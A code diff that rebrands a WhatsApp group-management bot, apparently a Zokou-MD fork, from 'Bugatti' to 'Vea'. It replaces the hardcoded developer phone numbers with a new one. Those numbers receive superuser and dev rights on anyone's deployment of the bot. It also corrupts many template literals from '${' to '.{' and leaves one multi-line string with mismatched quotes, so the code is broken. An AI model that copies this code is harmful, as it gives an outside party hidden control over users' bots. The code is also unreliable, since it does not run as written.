@@ -80,7 +80,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['BUGATTI', "safari", "1.0.0"],
+            browser: ['VEA', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -154,18 +154,18 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254740007567';
-            const dj2 = '254740007567';
-            const dj3 = "254740007567";
-            const luffy = '25490375710';
+            
+            
+            
+            const mdee = '254742221885';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [mdee,  conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
-            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [mdee].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{BUGATTI}...[][]");
+            console.log("\t [][]...{VEA}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message sent from : " + nomGroupe);
@@ -429,7 +429,7 @@ function mybotpic() {
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Bugatti',
+                                        pack: 'Vea',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -438,12 +438,12 @@ function mybotpic() {
                                         background: '#000000'
                                     });
                                     await sticker.toFile("st1.webp");
-                                    // var txt = `@${auteurMsgRepondu.split("@")[0]} a été rétiré du groupe..\n`
+                                    // var txt = `@.{auteurMsgRepondu.split("@")[0]} a été rétiré du groupe..\n`
                                     var action = await recupererActionJid(origineMessage);
 
                                       if (action === 'remove') {
 
-                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by Marisel.`;
+                                        txt += `message deleted \n @.{auteurMessage.split("@")[0]} removed from group by Marisel.`;
 
                                     await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                                     (0, baileys_1.delay)(800);
@@ -524,10 +524,10 @@ function mybotpic() {
                 participant: auteurMessage
             };
             var txt = "bot detected, \n";
-           // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
+           // txt += `message supprimé \n @.{auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: '𝐁𝐮𝐠𝐚𝐭𝐭𝐢',
+                pack: 'Vea',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -556,7 +556,7 @@ function mybotpic() {
             await fs.unlink("st1.webp"); } 
                 
                else if (action === 'delete') {
-                txt += `message delete \n @${auteurMessage.split("@")[0]} Avoid sending link.`;
+                txt += `message delete \n @.{auteurMessage.split("@")[0]} Avoid sending link.`;
                 //await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") }, { quoted: ms });
                await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                await zk.sendMessage(origineMessage, { delete: key });
@@ -579,7 +579,7 @@ function mybotpic() {
 
     } else {
         var rest = warnlimit - warn ;
-      var  msg = `bot detected , your warn_count was upgrade ;\n rest : ${rest} `;
+      var  msg = `bot detected , your warn_count was upgrade ;\n rest : .{rest} `;
 
       await ajouterUtilisateurAvecWarnCount(auteurMessage)
 
@@ -678,14 +678,14 @@ zk.ev.on('group-participants.update', async (group) => {
 
             let membres = group.participants;
             for (let membre of membres) {
-                msg += `║ @${membre.split("@")[0]}\n`;
+                msg += `║ @.{membre.split("@")[0]}\n`;
             }
 
             msg += `║
 ╚════◇◇◇═════╝
 ◇ *Descriptioon*   ◇
 
-${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬𝐞𝐥.`;
+.{metadata.desc}\n\n> Vea 𝐁𝐲 Mdee.`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -693,7 +693,7 @@ ${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬
 
             let membres = group.participants;
             for (let membre of membres) {
-                msg += `@${membre.split("@")[0]}\n`;
+                msg += `@.{membre.split("@")[0]}\n`;
             }
 
             zk.sendMessage(group.id, { text: msg, mentions: membres });
@@ -708,7 +708,7 @@ ${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬
          zk.sendMessage(
               group.id,
               {
-                text : `@${(group.author).split("@")[0]} has violated the anti-promotion rule, therefore both ${group.author.split("@")[0]} and @${(group.participants[0]).split("@")[0]} have been removed from administrative rights.`,
+                text : `@.{(group.author).split("@")[0]} has violated the anti-promotion rule, therefore both ${group.author.split("@")[0]} and @${(group.participants[0]).split("@")[0]} have been removed from administrative rights.`,
                 mentions : [group.author,group.participants[0]]
               }
          )
@@ -724,7 +724,7 @@ ${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬
            zk.sendMessage(
                 group.id,
                 {
-                  text : `@${(group.author).split("@")[0]} has violated the anti-demotion rule by removing @${(group.participants[0]).split("@")[0]}. Consequently, he has been stripped of administrative rights.` ,
+                  text : `@.{(group.author).split("@")[0]} has violated the anti-demotion rule by removing @${(group.participants[0]).split("@")[0]}. Consequently, he has been stripped of administrative rights.` ,
                   mentions : [group.author,group.participants[0]]
                 }
            )
@@ -758,7 +758,7 @@ ${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬
 
                 console.log(`etablissement d'un automute pour ${crons[i].group_id} a ${set[0]} H ${set[1]}`)
 
-                cron.schedule(`${set[1]} ${set[0]} * * *`, async () => {
+                cron.schedule(`.{set[1]} .{set[0]} * * *`, async () => {
                   await zk.groupSettingUpdate(crons[i].group_id, 'announcement');
                   zk.sendMessage(crons[i].group_id, { image : { url : './media/chrono.webp'} , caption: "Hello, it's time to close the group; sayonara." });
 
@@ -770,9 +770,9 @@ ${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬
               if (crons[i].unmute_at != null) {
                 let set = crons[i].unmute_at.split(':');
 
-                console.log(`etablissement d'un autounmute pour ${set[0]} H ${set[1]} `)
+                console.log(`etablissement d'un autounmute pour .{set[0]} H .{set[1]} `)
         
-                cron.schedule(`${set[1]} ${set[0]} * * *`, async () => {
+                cron.schedule(`.{set[1]} ${set[0]} * * *`, async () => {
 
                   await zk.groupSettingUpdate(crons[i].group_id, 'not_announcement');
 
@@ -813,16 +813,16 @@ ${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("Bugatti is connecting in your account...");
+                console.log("Vea is connecting in your account...");
             }
             else if (connection === 'open') {
-                console.log("Bugatti connected successfully☺️");
+                console.log("Vea connected successfully☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Bugatti by Marisel is installing cmds😇\n\n");
+                console.log("Vea by Mdee is installing cmds😇\n\n");
                 //chargement des commandes 
                 console.log("chargement des commandes ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
@@ -849,21 +849,21 @@ ${metadata.desc}\n\n> 𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐁𝐲 𝐌𝐚𝐫𝐢𝐬
                 else {
                     md = "undefined";
                 }
-                console.log("Bugatti successfully connected✅");
+                console.log("VEA successfully connected✅");
 
                 await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `𝐁𝐮𝐠𝐚𝐭𝐭𝐢 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞  ⏳\n${readmore}
+                let cmsg = 'VEA 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞  ⏳\n.{readmore}
     
-    𝗣𝗿𝗲𝗳𝗶𝘅 : [ ${prefixe} ]
-    𝗠𝗼𝗱𝗲 :${md} mode
+    𝗣𝗿𝗲𝗳𝗶𝘅 : [ .{prefixe} ]
+    𝗠𝗼𝗱𝗲 :.{md} mode
     𝗣𝗹𝘂𝗴𝗶𝗻𝘀 : 245
     𝗥𝗮𝗺 : 𝟲𝟴/𝟭𝟯𝟮 𝗚𝗕
     𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : 𝗟𝗶𝗻𝘂𝘅
-    𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : 𝐌𝐚𝐫𝐢𝐬𝐞𝐥
+    𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : mdee
 
-> 𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐃𝐞𝐩𝐥𝐨𝐲𝐢𝐧𝐠 𝐁𝐮𝐠𝐚𝐭𝐭𝐢`;
+> 𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐃𝐞𝐩𝐥𝐨𝐲𝐢𝐧𝐠 VEA MD`;
                     
                 await zk.sendMessage( zk.user.id, { text: cmsg });
                 }
